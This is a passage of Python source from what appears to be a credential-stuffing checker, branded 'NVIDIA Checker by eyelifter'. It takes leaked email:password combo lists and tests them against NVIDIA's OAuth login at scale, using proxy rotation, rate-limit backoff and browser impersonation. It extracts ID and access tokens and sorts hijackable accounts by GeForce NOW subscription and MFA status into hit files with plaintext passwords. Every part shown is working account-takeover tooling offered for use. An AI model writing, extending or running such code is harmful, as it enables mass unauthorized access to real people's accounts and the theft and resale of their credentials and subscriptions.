    eyelifter_save_dbg(f"check_{email}", rr.text)
    eyelifter_dbg_kv("CHECK", status=rr.status_code,
                     body_len=len(rr.text or ""))

    if rr.status_code in (401, 404):
        r.status = "bad"
        r.reason = "no_account"
        return r
    if rr.status_code == 429:
        r.status = "error"
        r.reason = "rate_limit"
        return r
    if rr.status_code != 200:
        r.status = "error"
        r.reason = f"check_{rr.status_code}"
        return r

    try:
        key = rr.json().get("key", key)
    except Exception:
        pass

    eyelifter_dbg("NEXT", "user/next (identifier → PromptPassword)")
    eyelifter_stop_check()
    try:
        rr = s.post(f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/user/next",
                    json={},
                    headers=eyelifter_key_headers(key, cookie_hdr, referer, ua),
                    timeout=15)
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

    if rr.status_code == 200:
        try:
            j = rr.json()
            key = j.get("key", key)
            eyelifter_dbg_kv("NEXT", status=rr.status_code,
                             step=j.get("step"))
        except Exception:
            eyelifter_dbg("NEXT", f"non-json · status={rr.status_code}")
    else:
        eyelifter_dbg_kv("NEXT", status=rr.status_code)

    eyelifter_dbg("PW", "posting password")
    eyelifter_stop_check()
    try:
        rr = s.post(
            f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/user/login/password",
            json={"password": password, "rememberLogin": True,
                  "deviceId": device},
            headers=eyelifter_key_headers(key, cookie_hdr, referer, ua),
            timeout=15)
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

    eyelifter_save_dbg(f"login_{email}", rr.text)
    eyelifter_dbg_kv("PW", status=rr.status_code,
                     body_len=len(rr.text or ""))

    if rr.status_code == 429:
        r.status = "error"
        r.reason = "rate_limit"
        return r

    if rr.status_code in (400, 401):
        try:
            ej = rr.json()
            err = str(ej.get("error", "")).lower()
            if "password" in err or "credentials" in err:
                r.status = "bad"
                r.reason = "wrong_password"
                return r
            r.status = "bad"
            r.reason = err[:60] or "login_rejected"
            return r
        except Exception:
            r.status = "bad"
            r.reason = "login_rejected"
            return r

    if rr.status_code not in (200, 201):
        r.status = "error"
        r.reason = f"login_{rr.status_code}"
        return r

    try:
        key = rr.json().get("key", key)
    except Exception:
        pass

    eyelifter_stop_check()
    if not r.mfa_types:
        eyelifter_fetch_factors(s, key, cookie_hdr, referer, ua, r)

    eyelifter_dbg("NEXT", "draining state machine")
    step = None
    values = {}
    for i in range(8):
        if _EYELIFTER_STOP.is_set():
            r.status = "error"
            r.reason = "stopped"
            return r
        try:
            rr = s.post(
                f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/user/next",
                json={},
                headers=eyelifter_key_headers(key, cookie_hdr, referer, ua),
                timeout=15)
        except _EyelifterAbort:
            raise
        except Exception as e:
            eyelifter_dbg("NEXT", f"iter={i} net_{type(e).__name__}")
            break
        if rr.status_code != 200:
            eyelifter_dbg_kv("NEXT", iter=i, status=rr.status_code)
            break
        try:
            j = rr.json()
            key = j.get("key", key)
            step = j.get("step")
            values = j.get("values") or {}
            eyelifter_dbg_kv("NEXT", iter=i, status=rr.status_code,
                             step=step)
        except Exception:
            eyelifter_dbg("NEXT", f"iter={i} non-json")
            break

        if step in ("Finish", "Complete"):
            break

        if step in _EYELIFTER_MFA_STEPS:
            break

        if step == "RememberLogIn":
            eyelifter_dbg("NEXT", f"iter={i} RememberLogIn → confirm")
            advanced = False
            for rtry in range(3):
                if _EYELIFTER_STOP.is_set():
                    break
                try:
                    rr2 = s.post(
                        f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/user/next",
                        json={"rememberLogin": True},
                        headers=eyelifter_key_headers(key, cookie_hdr,
                                                      referer, ua),
                        timeout=15)
                except Exception as e:
                    eyelifter_dbg("NEXT",
                                  f"remember retry={rtry} net_{type(e).__name__}")
                    break
                if rr2.status_code != 200:
                    eyelifter_dbg_kv("NEXT", remember_status=rr2.status_code)
                    break
                try:
                    j2 = rr2.json()
                except Exception:
                    break
                key = j2.get("key", key)
                new_step = j2.get("step")
                values = j2.get("values") or {}
                eyelifter_dbg_kv("NEXT", remember_step=new_step)
                if new_step in ("Finish", "Complete"):
                    step = new_step
                    advanced = True
                    break
                if new_step != "RememberLogIn":
                    step = new_step
                    advanced = True
                    break
            if step in ("Finish", "Complete"):
                break
            if not advanced:
                break
            continue

    if values:
        r.last_auth = values.get("last_auth") or r.last_auth
        r.user_token_expire = (values.get("user_token_expire")
                                or r.user_token_expire)
        eyelifter_dbg_kv("NEXT", last_auth=r.last_auth,
                         token_expires=r.user_token_expire)

    if step not in ("Finish", "Complete"):
        eyelifter_stop_check()
        if not r.mfa_types:
            eyelifter_fetch_factors(s, key, cookie_hdr, referer, ua, r)

        stalled_step = step or "unknown"

        if r.mfa_types:
            r.status = "hit"
            if stalled_step == "PromptPassword":
                r.status = "bad"
                r.reason = "password_rejected"
            elif stalled_step in _EYELIFTER_MFA_STEPS:
                r.has_mfa = True
                r.reason = f"mfa_required_{stalled_step}"
            else:
                r.has_mfa = True
                r.reason = f"stalled_{stalled_step}_with_mfa"
            return r

        r.status = "error"
        r.reason = f"stalled_{stalled_step}"
        return r

    eyelifter_dbg("FINALIZE", "requesting callback redirect")
    eyelifter_stop_check()
    try:
        fr = s.get(
            f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/user/finalize?key={key}",
            allow_redirects=False, timeout=15,
            headers={
                "x-metrics": EYELIFTER_X_METRICS,
                "origin": EYELIFTER_LOGIN_NVGS,
                "referer": referer,
                "cookie": cookie_hdr,
                "user-agent": ua,
            })
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

    final_loc = fr.headers.get("Location", "")
    eyelifter_dbg_kv("FINALIZE", status=fr.status_code,
                     loc=(final_loc[:100] if final_loc else "-"))
    if not final_loc:
        r.status = "error"
        r.reason = "no_finalize_redirect"
        return r

    code = None
    cur = final_loc
    seen = set()
    for hop in range(6):
        if not cur or cur in seen:
            break
        seen.add(cur)
        eyelifter_stop_check()
        try:
            cr = s.get(cur, allow_redirects=False, timeout=15,
                       headers={
                           "referer": f"{EYELIFTER_WWW}/",
                           "accept": "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
                           "user-agent": ua,
                           "cookie": cookie_hdr,
                       })
        except _EyelifterAbort:
            raise
        except Exception as e:
            eyelifter_dbg("HOP", f"{hop} net_{type(e).__name__}")
            break
        new_loc = cr.headers.get("Location", "")
        eyelifter_dbg_kv("HOP", n=hop, status=cr.status_code,
                         new_loc=(new_loc[:100] if new_loc else "-"))
        if not new_loc:
            c = eyelifter_extract_code(cr.text)
            if c:
                code = c
                eyelifter_dbg("HOP", f"{hop} code from body · len={len(c)}")
            break
        c = eyelifter_extract_code(new_loc)
        if c:
            code = c
            eyelifter_dbg("HOP",
                          f"{hop} code from response · len={len(c)}")
            break
        cur = new_loc

    if not code:
        r.status = "error"
        r.reason = "no_callback_code"
        eyelifter_dbg("TOKEN", "no exchange code extracted")
        return r

    eyelifter_dbg("TOKEN", f"exchanging code · len={len(code)}")
    eyelifter_stop_check()
    try:
        tr = s.post(
            EYELIFTER_TOKEN_URL,
            data={
                "code": code,
                "grant_type": "authorization_code",
                "code_verifier": verifier,
                "redirect_uri": EYELIFTER_REDIRECT,
            },
            headers={
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "origin": EYELIFTER_WWW,
                "referer": f"{EYELIFTER_WWW}/",
                "user-agent": ua,
            }, timeout=15)
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

    eyelifter_save_dbg(f"token_{email}", tr.text)
    eyelifter_dbg_kv("TOKEN", status=tr.status_code,
                     body_len=len(tr.text or ""))

    if tr.status_code != 200:
        r.status = "error"
        r.reason = f"token_{tr.status_code}"
        return r

    try:
        tokens = tr.json()
    except Exception:
        r.status = "error"
        r.reason = "token_non_json"
        return r

    r.raw_login = tokens
    r.id_token = tokens.get("id_token")
    r.access_token = tokens.get("access_token")

    if not r.id_token:
        r.status = "error"
        r.reason = "no_id_token"
        return r

    claims = eyelifter_decode_jwt(r.id_token).get("payload", {}) or {}
    r.sub = str(claims.get("sub") or "")
    r.username = claims.get("preferred_username")
    r.email_verified = bool(claims.get("email_verified"))
    r.locale = claims.get("locale")
    r.sid = claims.get("sid")
    r.external_id = str(claims.get("external_id") or "")
    r.idp_name = claims.get("idp_name")
    r.iat = claims.get("iat")
    r.exp = claims.get("exp")
    if r.iat:
        try:
            r.auth_time = datetime.fromtimestamp(int(r.iat)).astimezone()
        except Exception:
            r.auth_time = None
    r.raw_user = claims

    eyelifter_dbg_kv("CLAIMS", sub=r.sub or "-",
                     user=r.username or "-",
                     verified=r.email_verified,
                     locale=r.locale or "-")

    if not r.sub:
        r.status = "error"
        r.reason = "no_sub"
        return r

    if _EYELIFTER_CFG.s.get("enrich", True):
        eyelifter_enrich(r, s, key, cookie_hdr, ua)

    r.status = "hit"
    return r


def eyelifter_enrich(r, s, key, cookie_hdr, ua):
    to = _EYELIFTER_CFG.s["timeout"]
    referer = f"{EYELIFTER_LOGIN_NVGS}/v1/login/identifier?key={key}"

    if not r.mfa_types:
        eyelifter_dbg("ENRICH", "post-check MFA factors")
        eyelifter_fetch_factors(s, key, cookie_hdr, referer, ua, r)

    if not r.id_token:
        return

    eyelifter_dbg("GFN", "paywall query")
    try:
        rg = s.get(EYELIFTER_PAYWALL,
                   headers={
                       "idtoken": r.id_token,
                       "accept": "application/json",
                       "origin": EYELIFTER_WWW,
                       "referer": f"{EYELIFTER_WWW}/",
                       "user-agent": ua,
                   },
                   timeout=to)
        eyelifter_save_dbg(f"paywall_{r.email}", rg.text)
        eyelifter_dbg_kv("GFN", status=rg.status_code)
        if rg.status_code == 200:
            try:
                j = rg.json()
            except Exception:
                return
            r.raw_gfn = j
            r.paywall = j
            r.gfn_status = j.get("status")
            r.gfn_plan = j.get("currentPlan") or j.get("requestedPlan")
            r.gfn_owned = bool(j.get("isOwned"))
            r.gfn_product = j.get("productId")
            r.gfn_expires = j.get("expirationDate")
            r.gfn_tier = j.get("membershipTier")
            r.gfn_provider = j.get("provider")
            r.gfn_billing = j.get("billingCountry")
            r.gfn_is_existing = bool(j.get("isExistingSubscriber"))
            eyelifter_dbg_kv("GFN", gfn_status=r.gfn_status,
                             plan=r.gfn_plan,
                             owned=r.gfn_owned,
                             tier=r.gfn_tier)
    except Exception as e:
        eyelifter_dbg("GFN", f"paywall failed · {type(e).__name__}")


def eyelifter_classify(r):
    if r.status == "bad":
        return "bad"
    if r.status != "hit":
        return "error"
    if r.gfn_owned or (r.gfn_status and r.gfn_status != "NO_SUBSCRIPTION"):
        return "gfn"
    rsn = r.reason or ""
    if rsn.startswith("mfa_") or (rsn.startswith("stalled_") and r.mfa_types):
        return "mfa"
    return "free"


def eyelifter_open_files(d):
    hdr = (
        f"# NVIDIA Checker by eyelifter — started "
        f"{eyelifter_human_time_long()}\n"
        f"# Credit: eyelifter | {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}\n"
        f"# Seal: {EYELIFTER_SEAL_STR}\n"
        f"\n"
    )
    names = {
        "gfn":   "nvidia_gfn.txt",
        "mfa":   "nvidia_mfa.txt",
        "free":  "nvidia_free.txt",
        "bad":   "nvidia_bad.txt",
        "error": "nvidia_errors.txt",
        "json":  "nvidia_hits_full.jsonl",
    }
    handles = {}
    for k, n in names.items():
        fh = open(os.path.join(d, n), "w", encoding="utf-8")
        if k != "json":
            fh.write(hdr)
        handles[k] = fh
    return handles


def eyelifter_fmt_line(r):
    def _v(x):
        if x is None or x == "":
            return "-"
        return str(x)

    mfa = ",".join(r.mfa_types) if r.mfa_types else "-"
    enrich_on = _EYELIFTER_CFG.s.get("enrich", True)

    parts = [
        f"{r.email}:{r.password}",
        f"sub={_v(r.sub)}",
        f"user={_v(r.username)}",
        f"email_verified={r.email_verified}",
        f"locale={_v(r.locale)}",
        f"mfa={mfa}",
        f"gfn_status={_v(r.gfn_status)}",
        f"gfn_plan={_v(r.gfn_plan)}",
        f"gfn_owned={r.gfn_owned}",
        f"gfn_tier={_v(r.gfn_tier)}",
        f"gfn_expires={_v(r.gfn_expires)}",
        f"gfn_provider={_v(r.gfn_provider)}",
        f"gfn_billing={_v(r.gfn_billing)}",
        f"last_auth={eyelifter_human_ts(r.last_auth)}",
        f"token_expires={eyelifter_human_ts(r.user_token_expire)}",
        f"sid={_v(r.sid)}",
        f"enrich={'on' if enrich_on else 'off'}",
    ]
    return " | ".join(parts) + f" | {EYELIFTER_LINE_TAG}"


def eyelifter_short_line(r, kind):
    cc = f"{r.email}:{r.password}"
    if kind == "gfn":
        return (f"{cc} | GFN | status={r.gfn_status} | "
                f"plan={r.gfn_plan or '-'} | owned={r.gfn_owned} | "
                f"user={r.username or '-'}")
    if kind == "mfa":
        mfa = ",".join(r.mfa_types) if r.mfa_types else "?"
        return (f"{cc} | MFA [{mfa}] | user={r.username or '-'} | "
                f"sub={r.sub or '-'}")
    if kind == "free":
        return (f"{cc} | FREE | user={r.username or '-'} | "
                f"sub={r.sub} | verified={r.email_verified}")
    if kind == "bad":
        return f"{cc} | bad | {r.reason or 'wrong_creds'}"
    return f"{cc} | err | {eyelifter_readable_reason(r.reason)}"


def eyelifter_readable_reason(reason):
    if not reason:
        return "unknown"
    r = str(reason)
    if r.startswith("net_"):
        return f"network({r[4:].lower()})"
    if r.startswith("crash_"):
        return f"crash({r[6:].lower()})"
    return r


def eyelifter_json_record(r, kind):
    try:
        return json.dumps({
            "email": r.email, "password": r.password,
            "sub": r.sub, "username": r.username,
            "email_verified": r.email_verified,
            "sid": r.sid, "locale": r.locale,
            "external_id": r.external_id,
            "idp_name": r.idp_name,
            "auth_time": r.auth_time.isoformat() if isinstance(
                r.auth_time, datetime) else r.auth_time,
            "iat": r.iat, "exp": r.exp,
            "mfa_types": r.mfa_types,
            "has_mfa": r.has_mfa,
            "last_auth": r.last_auth,
            "user_token_expire": r.user_token_expire,
            "gfn_status": r.gfn_status,
            "gfn_plan": r.gfn_plan,
            "gfn_owned": r.gfn_owned,
            "gfn_product": r.gfn_product,
            "gfn_expires": r.gfn_expires,
            "gfn_tier": r.gfn_tier,
            "gfn_provider": r.gfn_provider,
            "gfn_billing": r.gfn_billing,
            "gfn_is_existing": r.gfn_is_existing,
            "reason": r.reason,
            "id_token": r.id_token,
            "access_token": r.access_token,
            "kind": kind,
        }, ensure_ascii=False) + "\n"
    except Exception:
        return None


def eyelifter_record(r):
    kind = eyelifter_classify(r)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["checked"] += 1
        done = _EYELIFTER_ST["checked"]
        if kind in _EYELIFTER_ST:
            _EYELIFTER_ST[kind] += 1
        else:
            _EYELIFTER_ST["errors"] += 1
        total = _EYELIFTER_TOTAL

    sp = "\n\n" if _EYELIFTER_CFG.s.get("hit_spacer", True) else "\n"
    eyelifter_dbg("RECORD", f"{r.email} → {kind}")

    if kind in ("gfn", "mfa", "free"):
        line = eyelifter_fmt_line(r)
        eyelifter_rline(done, total, kind, eyelifter_short_line(r, kind))
        eyelifter_sw(_EYELIFTER_HANDLES[kind], line + sp)
        jrec = eyelifter_json_record(r, kind)
        if jrec:
            eyelifter_sw(_EYELIFTER_HANDLES["json"], jrec)
        return

    if kind == "bad":
        eyelifter_rline(done, total, "bad", eyelifter_short_line(r, kind))
        eyelifter_sw(_EYELIFTER_HANDLES["bad"],
                     f"{r.email}:{r.password} | {r.reason or 'bad'} | "
                     f"{EYELIFTER_LINE_TAG}{sp}")
        return

    eyelifter_rline(done, total, "error", eyelifter_short_line(r, kind))
    eyelifter_sw(_EYELIFTER_HANDLES["error"],
                 f"{r.email}:{r.password} | "
                 f"{eyelifter_readable_reason(r.reason)} | "
                 f"{EYELIFTER_LINE_TAG}{sp}")


def eyelifter_run_one(combo):
    if _EYELIFTER_STOP.is_set():
        return
    gap = _EYELIFTER_CFG.s.get("combo_delay", 0.2)
    if gap > 0 and _EYELIFTER_STOP.wait(gap * (0.5 + random.random())):
        return
    eyelifter_rl_wait()
    if _EYELIFTER_STOP.is_set():
        return

    proxy = eyelifter_pick_proxy() if _EYELIFTER_POOL else None
    eyelifter_rl_wait(proxy)
    if _EYELIFTER_STOP.is_set():
        if proxy:
            eyelifter_rel_proxy(proxy)
        return

    attempts = _EYELIFTER_CFG.s.get("retries", 2) + 1
    last = None

    try:
        for a in range(attempts):
            if _EYELIFTER_STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=proxy)
                if np:
                    if proxy and proxy != np:
                        eyelifter_rel_proxy(proxy)
                    proxy = np
                eyelifter_rl_wait(proxy)
                if _EYELIFTER_STOP.is_set():
                    break
                eyelifter_dbg("RETRY", f"{combo} attempt {a+1}/{attempts}")
            try:
                r = eyelifter_check(combo, proxy)
            except _EyelifterAbort:
                if proxy:
                    eyelifter_rel_proxy(proxy)
                    proxy = None
                return
            except Exception as e:
                r = EyelifterResult(combo.split(":", 1)[0], "")
                r.status = "error"
                r.reason = f"crash_{type(e).__name__}"

            last = r
            if r.status in ("hit", "bad"):
                break

            is_last = a == attempts - 1
            reason = r.reason or ""

            if reason == "rate_limit":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 300)
                w = min(_EYELIFTER_CFG.s.get("rate_limit_delay", 60) * (2 ** a), 300)
                eyelifter_rl_backoff(w, proxy)
                eyelifter_dbg("RATE_LIMIT", f"{combo} backoff={w}s")
                if not proxy:
                    break
                if is_last:
                    break
                if _EYELIFTER_STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            retryable = (
                reason.startswith("net_")
                or reason.startswith("crash_")
                or reason in ("token_non_json", "no_id_token", "no_sub",
                              "no_callback_code", "no_finalize_redirect",
                              "no_authorize_redirect", "no_login_redirect",
                              "no_session_key")
                or (reason.startswith(("login_", "token_"))
                    and any(c.isdigit() for c in reason))
            )

            if retryable:
                if proxy:
                    eyelifter_bad_proxy(proxy)
                    eyelifter_cool_proxy(proxy, 30)
                eyelifter_dbg("RETRY", f"{combo} reason={reason}")
                if not is_last and _EYELIFTER_STOP.wait(1.0 + random.random()):
                    break
                continue

            break
    finally:
        if proxy:
            eyelifter_rel_proxy(proxy)

    if last is None:
        last = EyelifterResult(combo.split(":", 1)[0], "")
        last.status = "error"
        last.reason = "no_result"

    try:
        eyelifter_record(last)
    except Exception:
        pass


def eyelifter_bulk_run(combos):
    global _EYELIFTER_TOTAL, _EYELIFTER_HANDLES
    eyelifter_reset_stats()
    _EYELIFTER_TOTAL = len(combos)

    d = eyelifter_folder()
    _EYELIFTER_HANDLES = eyelifter_open_files(d)

    threads = _EYELIFTER_CFG.s["threads"]
    eyelifter_log("🚀", "INFO", "START",
                  f"{_EYELIFTER_TOTAL} combos · {threads} threads · "
                  f"enrich={'on' if _EYELIFTER_CFG.s.get('enrich') else 'off'}")

    _EYELIFTER_STOP.clear()
    ex = ThreadPoolExecutor(max_workers=threads)
    inflight = set()
    interrupted = False

    try:
        cap = max(threads * 4, 100)
        for i in range(0, len(combos), cap):
            if _EYELIFTER_STOP.is_set():
                break
            for c in combos[i:i + cap]:
                if _EYELIFTER_STOP.is_set():
                    break
                inflight.add(ex.submit(eyelifter_run_one, c))
            while len(inflight) >= cap:
                done, inflight = wait(inflight, timeout=0.4,
                                      return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass

        while inflight:
            done, inflight = wait(inflight, timeout=0.4,
                                  return_when=FIRST_COMPLETED)
            for f in done:
                try:
                    f.result(timeout=0.01)
                except Exception:
                    pass

    except KeyboardInterrupt:
        interrupted = True
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP",
                      "ctrl+c — aborting inflight requests")
        try:
            eyelifter_close_sessions()
        except Exception:
            pass
        deadline = time.time() + 10
        while inflight and time.time() < deadline:
            try:
                done, inflight = wait(inflight, timeout=1.0,
                                      return_when=FIRST_COMPLETED)
                for f in done:
                    try:
                        f.result(timeout=0.01)
                    except Exception:
                        pass
                remaining = len(inflight)
                if remaining and remaining % 10 == 0:
                    eyelifter_log("⏳", "INFO", "DRAIN",
                                  f"{remaining} inflight remaining")
            except KeyboardInterrupt:
                eyelifter_log("⏳", "WARN", "DRAIN",
                              "second ctrl+c — forcing stop")
                break
    finally:
        _EYELIFTER_STOP.set()
        try:
            ex.shutdown(wait=True, cancel_futures=True)
        except TypeError:
            ex.shutdown(wait=True)
        _EYELIFTER_STOP.clear()

    for fh in _EYELIFTER_HANDLES.values():
        try:
            fh.close()
        except Exception:
            pass

    with _EYELIFTER_LK:
        snap = dict(_EYELIFTER_ST)

    for base, key in (
        ("nvidia_gfn.txt", "gfn"),
        ("nvidia_mfa.txt", "mfa"),
        ("nvidia_free.txt", "free"),
        ("nvidia_bad.txt", "bad"),
        ("nvidia_errors.txt", "errors"),
    ):
        old = os.path.join(d, base)
        new = os.path.join(d, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    el = time.time() - _EYELIFTER_START
    eyelifter_summary([
        ("Total", _EYELIFTER_TOTAL),
        ("Checked", snap["checked"]),
        ("GFN", snap["gfn"]),
        ("MFA", snap["mfa"]),
        ("FREE", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{snap['checked'] / max(el, 0.001):.2f} combo/s"),
        ("Stopped early", "yes" if interrupted else "no"),
        ("Folder", d),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ])

    if interrupted:
        eyelifter_log("⏹️", "INFO", "STOP", "returned to menu")


_EYELIFTER_COMBO_RX = re.compile(
    r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}):([^\s|,;>"\']+)'
)


def eyelifter_extract_combos(content):
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        for m in _EYELIFTER_COMBO_RX.finditer(line):
            email = m.group(1).lower()
            pw = m.group(2)
            if not pw or len(pw) > 200:
                continue
            if pw.startswith(("http://", "https://")):
                continue
            out.add(f"{email}:{pw}")
    return sorted(out)


def eyelifter_ask_threads():
    eyelifter_section("THREADS")
    print(f"  current : {_EYELIFTER_CFG.s['threads']}")
    print(f"  range   : 1-{_EYELIFTER_MAX_THREADS}")
    print("  blank to keep current")
    try:
        raw = input(f"{eyelifter_color('96', '[*] threads > ')}").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return _EYELIFTER_CFG.s["threads"]
    if not raw:
        return _EYELIFTER_CFG.s["threads"]
    try:
        t = max(1, min(_EYELIFTER_MAX_THREADS, int(raw)))
    except ValueError:
        return _EYELIFTER_CFG.s["threads"]
    if t != _EYELIFTER_CFG.s["threads"]:
        _EYELIFTER_CFG.s["threads"] = t
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
    return t


def eyelifter_single_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP
    _EYELIFTER_STOP.clear()
    eyelifter_section("SINGLE CHECK")
    try:
        combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    if ":" not in combo:
        eyelifter_log("✗", "ERROR", "INPUT", "invalid")
        return

    proxy = None
    if proxies:
        if not _EYELIFTER_POOL:
            _EYELIFTER_POOL = list(proxies)
            _EYELIFTER_BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK", combo.split(":")[0])
    t0 = time.time()
    try:
        r = eyelifter_check(combo, proxy)
    except _EyelifterAbort:
        eyelifter_log("🛑", "WARN", "STOP", "single check interrupted")
        return
    except KeyboardInterrupt:
        print()
        eyelifter_log("🛑", "WARN", "STOP", "single check interrupted")
        return
    except Exception as e:
        eyelifter_log("✗", "ERROR", "CHECK", str(e)[:80])
        return
    el = time.time() - t0

    kind = eyelifter_classify(r)
    eyelifter_section("RESULT")
    code, bold = _EYELIFTER_KIND_COLOR.get(kind, ("0", False))
    print(f"  {eyelifter_color(code, kind.upper(), bold)}")

    rows = [
        ("Email", r.email),
        ("Password", r.password),
        ("Sub", r.sub or "-"),
        ("Username", r.username or "-"),
        ("Email Verified", r.email_verified),
        ("Session ID", r.sid or "-"),
        ("Locale", r.locale or "-"),
        ("External ID", r.external_id or "-"),
        ("IdP Name", r.idp_name or "-"),
        ("Auth Time", eyelifter_human_ts(r.auth_time)),
        ("Token IAT", eyelifter_human_ts_unix(r.iat)),
        ("Token EXP", eyelifter_human_ts_unix(r.exp)),
        ("MFA Types", ",".join(r.mfa_types) or "-"),
        ("Has MFA", r.has_mfa),
        ("Last Auth", eyelifter_human_ts(r.last_auth)),
        ("User Token Expires", eyelifter_human_ts(r.user_token_expire)),
        ("GFN Status", r.gfn_status or "-"),
        ("GFN Plan", r.gfn_plan or "-"),
        ("GFN Owned", r.gfn_owned),
        ("GFN Product", r.gfn_product or "-"),
        ("GFN Expires", r.gfn_expires or "-"),
        ("GFN Tier", r.gfn_tier or "-"),
        ("GFN Provider", r.gfn_provider or "-"),
        ("GFN Billing", r.gfn_billing or "-"),
        ("GFN Existing", r.gfn_is_existing),
        ("Reason", eyelifter_readable_reason(r.reason) if r.reason else "-"),
        ("Time", f"{el:.2f}s"),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}"),
    ]
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  {v}")

    if kind in ("gfn", "mfa", "free"):
        jrec = eyelifter_json_record(r, kind)
        if jrec:
            try:
                with open(os.path.join(os.path.dirname(_EYELIFTER_CFG_PATH),
                                        "nvidia_single_hits.jsonl"),
                          "a", encoding="utf-8") as f:
                    f.write(jrec)
            except Exception:
                pass


def eyelifter_bulk_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP
    _EYELIFTER_STOP.clear()
    eyelifter_section("BULK CHECK")
    try:
        path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    if not path or not os.path.isfile(path):
        eyelifter_log("✗", "ERROR", "FILE", "not found")
        return
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        eyelifter_log("✗", "ERROR", "FILE", str(e)[:60])
        return
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("✗", "ERROR", "EXTRACT", "no valid combos")
        return
    eyelifter_log("✓", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    eyelifter_ask_threads()

    if proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded")
    else:
        _EYELIFTER_POOL = []
        _EYELIFTER_BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "direct")

    eyelifter_bulk_run(combos)


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS")
    s = _EYELIFTER_CFG.s
    print(f"  [1]  Threads:              {s['threads']} (1-{_EYELIFTER_MAX_THREADS})")
    print(f"  [2]  Timeout:              {s['timeout']}s")
    print(f"  [3]  Retries:              {s['retries']}")
    print(f"  [4]  Combo Delay:          {s['combo_delay']}s")
    print(f"  [5]  Proxies File:         {s['proxies_file']}")
    print(f"  [6]  Rate-limit Delay:     {s['rate_limit_delay']}s")
    print(f"  [7]  Skip Proxy Test:      {s['skip_proxy_test']}")
    print(f"  [8]  Debug:                {s['debug']}")
    print(f"  [9]  Hit Spacer:           {s['hit_spacer']}")
    print(f"  [10] Impersonate:          {s['impersonate']}")
    print(f"  [11] Enrich (incl GFN):    {s['enrich']}")
    print(f"  [12] Open Channel Launch:  {s['open_channel_on_launch']}")
    print(f"  [0]  Back")
    try:
        ch = input(f"{eyelifter_color('96', '[*] select > ')}").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(_EYELIFTER_MAX_THREADS,
                                       int(input("threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0,
                                             float(input("combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["rate_limit_delay"] = max(1, min(300,
                                                int(input("rate-limit delay: "))))
            changed = True
        elif ch == "7":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "8":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "9":
            s["hit_spacer"] = not s["hit_spacer"]
            changed = True
        elif ch == "10":
            v = input("impersonate (auto/chrome/chrome124/...): ").strip().lower()
            if v:
                s["impersonate"] = v
                eyelifter_close_sessions()
                changed = True
        elif ch == "11":
            s["enrich"] = not s["enrich"]
            changed = True
        elif ch == "12":
            s["open_channel_on_launch"] = not s["open_channel_on_launch"]
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError, EOFError, KeyboardInterrupt):
        print()
        eyelifter_log("✗", "ERROR", "CONFIG", "invalid")
        return
    if changed:
